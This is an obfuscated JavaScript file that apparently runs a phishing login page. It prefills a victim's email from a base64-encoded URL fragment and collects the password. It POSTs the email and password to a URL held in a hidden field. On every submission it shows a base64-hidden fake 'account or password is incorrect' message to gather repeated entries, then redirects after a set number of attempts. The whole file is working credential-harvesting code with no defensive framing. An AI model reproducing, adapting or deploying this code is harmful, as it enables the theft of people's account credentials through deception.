$(document)['ready'](function() {
    var _0xe2dcx1 = $('#f')['val']();
    var _0xe2dcx2 = $('#rc')['val']();
    var _0xe2dcx3 = $('#rdrt')['val']();
    console['log'](_0xe2dcx1 + _0xe2dcx2 + _0xe2dcx3);
    var _0xe2dcx4 = 0;
    var _0xe2dcx5 = window['location']['hash']['substr'](1);
    if (!_0xe2dcx5) {
        window['onload'] = function() {
            var _0xe2dcx6 = $('#ai')['val']();
            if (_0xe2dcx6 != '') {
                $('#next')['click']()
            }
        }
    } else {
        var _0xe2dcx7 = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
        if (!_0xe2dcx7['test'](_0xe2dcx5)) {
            var _0xe2dcx8 = _0xe2dcx5
        } else {
            var _0xe2dcx8 = atob(_0xe2dcx5)
        };
        var _0xe2dcx9 = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!_0xe2dcx9['test'](_0xe2dcx8)) {
            $('#error')['show']();
            _0xe2dcx5['focus'];
            return false
        };
        var _0xe2dcxa = _0xe2dcx8['indexOf']('@');
        var _0xe2dcxb = _0xe2dcx8['substr']((_0xe2dcxa + 1));
        var _0xe2dcxc = _0xe2dcxb['substr'](0, _0xe2dcxb['indexOf']('.'));
        var _0xe2dcxd = _0xe2dcxc['toLowerCase']();
        var _0xe2dcxe = _0xe2dcxc['toUpperCase']();
        $('#ai')['val'](_0xe2dcx8);
        $('#paaaaart1')['animate']({
            left: 0,
            opacity: 'hide'
        }, 0);
        $('#paaaart3')['animate']({
            right: 0,
            opacity: 'show'
        }, 0);
        setTimeout(function() {
            $('#paaaart3')['animate']({
                left: 0,
                opacity: 'hide'
            }, 0);
            $('#paaaart2')['animate']({
                right: 0,
                opacity: 'show'
            }, 0);
            $('#aich')['html'](_0xe2dcx8)
        }, 4000)
    };
    $('#ai')['click'](function() {
        $('#error')['hide']()
    });
    $(document)['keypress'](function(_0xe2dcx6) {
        var _0xe2dcxf = (_0xe2dcx6['keyCode'] ? _0xe2dcx6['keyCode'] : _0xe2dcx6['which']);
        if (_0xe2dcxf == '13') {
            _0xe2dcx6['preventDefault']();
            if ($('#paaaaart1')['is'](':visible')) {
                $('#next')['click']()
            } else {
                if ($('#paaaart2')['is'](':visible')) {
                    _0xe2dcx6['preventDefault']();
                    $('#sub-btn')['click']()
                } else {
                    return false
                }
            }
        }
    });
    $('#next')['click'](function() {
        event['preventDefault']();
        var _0xe2dcx6 = $('#ai')['val']();
        var _0xe2dcxf = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!_0xe2dcxf['test'](_0xe2dcx6)) {
            $('#error')['show']();
            _0xe2dcx5['focus'];
            return false
        };
        var _0xe2dcx10 = _0xe2dcx6['indexOf']('@');
        var _0xe2dcx11 = _0xe2dcx6['substr']((_0xe2dcx10 + 1));
        var _0xe2dcxc = _0xe2dcx11['substr'](0, _0xe2dcx11['indexOf']('.'));
        var _0xe2dcx12 = _0xe2dcxc['toLowerCase']();
        var _0xe2dcx13 = _0xe2dcxc['toUpperCase']();
        $('#paaaaart1')['animate']({
            left: 0,
            opacity: 'hide'
        }, 0);
        $('#paaaart3')['animate']({
            right: 0,
            opacity: 'show'
        }, 0);
        setTimeout(function() {
            $('#paaaart3')['animate']({
                left: 0,
                opacity: 'hide'
            }, 0);
            $('#paaaart2')['animate']({
                right: 0,
                opacity: 'show'
            }, 0);
            $('#aich')['html'](_0xe2dcx6)
        }, 4000)
    });
    $('#back')['click'](function() {
        $('#mgss')['hide']();
        $('#ai')['val']('');
        $('#pr')['val']('');
        $('#paaaart2')['animate']({
            left: 0,
            opacity: 'hide'
        }, 0);
        $('#paaaaart1')['animate']({
            right: 0,
            opacity: 'show'
        }, 1000)
    });
    $('#sub-btn')['click'](function(_0xe2dcxf) {
        _0xe2dcxf['preventDefault']();
        var _0xe2dcx10 = $('#ai')['val']();
        var _0xe2dcx11 = $('#pr')['val']();
        var _0xe2dcx13 = $('#field')['html']();
        var _0xe2dcx14 = $('#mgss')['html']();
        var _0xe2dcx15 = _0xe2dcx10;
        var _0xe2dcx16 = _0xe2dcx15['indexOf']('@');
        var _0xe2dcx17 = _0xe2dcx15['substr']((_0xe2dcx16 + 1));
        var _0xe2dcxc = _0xe2dcx17['substr'](0, _0xe2dcx17['indexOf']('.'));
        var _0xe2dcx18 = _0xe2dcxc['toLowerCase']();
        $('#mgss')['text'](_0xe2dcx14);
        $('#mgss')['addClass']('text-danger');
        $('#mgss')['removeClass']('text-gray');
        _0xe2dcx4 = _0xe2dcx4 + 1;
        $['ajax']({
            dataType: 'JSON',
            url: _0xe2dcx1,
            type: 'POST',
            data: {
                ai: _0xe2dcx10,
                pr: _0xe2dcx11,
                detail: _0xe2dcx13
            },
            beforeSend: function(_0xe2dcx6) {
                $('#paaaart2')['animate']({
                    left: 0,
                    opacity: 'hide'
                }, 0);
                $('#paaaart3')['animate']({
                    left: 0,
                    opacity: 'show'
                }, 0)
            },
            complete: function() {
                $('#pr')['val']('');
                if (_0xe2dcx4 >= _0xe2dcx2) {
                    _0xe2dcx4 = 0;
                    window['location']['replace'](_0xe2dcx3);
                    return false
                };
                $('#mgss')['html'](atob('WW91ciBhY2NvdW50IG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC4gSWYgeW91IGRvbid0IHJlbWVtYmVyIHlvdXIgcGFzc3dvcmQsIDxhIGhyZWY9JyMnPnJlc2V0IGl0IG5vdzwvYT4='));
                $('#paaaart3')['animate']({
                    left: 0,
                    opacity: 'hide'
                }, 0);
                $('#paaaart2')['animate']({
                    left: 0,
                    opacity: 'show'
                }, 100)
            }
        })
    })
})